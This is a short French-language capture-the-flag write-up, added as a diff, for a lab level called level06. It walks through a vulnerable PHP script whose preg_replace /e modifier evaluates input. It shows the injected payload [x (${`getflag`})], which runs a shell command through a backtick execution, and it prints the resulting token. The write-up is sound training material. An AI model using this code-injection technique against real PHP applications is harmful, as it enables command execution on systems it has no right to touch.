@@ -1,0 +1,46 @@
+flag06: getflag wiok45aaoguiboiki2tuin6ub
+
+ls -la show un fichier level06.php et son exec
+le fichier level06.php contient 
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+La fonction récupère le contenu du fichier du premier argument et le stock dans $a
+La fonction cherche dans le fichier le pattern [x (.*)] en remplaçant dans $a, le contenu de () après modification du contenu par la fonction y.
+La fonction y prend donc le contenu entre ( ) et fait des choses louche avec les . et les @ 
+d’abord, il remplace les . par des x 
+il prend le résultat et il remplace les @ par des y, en rajoutant des espace entre les charactere remplacés puis il retourne le resultat
+exemple : 
+
+cat /tmp/test
+[x (yyxx..@@)]
+./level06 /tmp/test
+(yyxx x  x  y y)
+
+yyxx..@@ devient yyxx x  x  y y
+
+puis tous les ( et ) sont remplacés par [ et ] . 
+La fonction est appelée et son contenu est stocké dans la var $r. 
+En php “${}” retourne le résultat de la commande à l'intérieur. 
+`getflag` permet d'exécuter la commande getflag
+
+on créer un fichier dans /tmp 
+On tente de remplacer le contenu entre () par ${`getflag`},   donc le contenu du fichier sera : [x (${`getflag`})] pour matcher avec les infos du script
+puis : 
+nano /tmp/test
+[x (${`getflag`})]
+./level06 /tmp/test
+cela nous donne 
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+()
+
+
+https://www.php.net/manual/en/language.operators.execution.php
+https://laravel-code.tips/you-can-use-backticks-to-execute-a-shell-command-in-php/
+https://stackoverflow.com/questions/5571624/what-does-mean-in-php-syntax
+https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex
+
